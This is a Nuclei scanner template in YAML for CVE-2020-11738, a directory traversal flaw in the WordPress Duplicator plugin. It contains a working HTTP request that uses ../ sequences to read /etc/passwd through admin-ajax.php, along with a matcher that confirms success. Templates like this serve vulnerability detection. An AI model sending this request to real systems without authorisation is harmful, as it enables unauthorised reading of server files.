id: cve-2020-11738
info:
  name: Wordpress Duplicator 1.3.26 Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The Snap Creek Duplicator plugin before 1.3.28 for WordPress (and Duplicator Pro before 3.8.7.1) allows Directory Traversal via ../ in the file parameter to duplicator_download or duplicator_init, allowing arbitrary file read.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11738
    - https://wordpress.org/plugins/duplicator
  classification:
    cvss-score: 7.5
    cve-id: CVE-2020-11738
  metadata:
    product: Duplicator
    vul-type: File Read
    tags: wordpress,duplicator,file-read
http:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[x*]:0:0:"
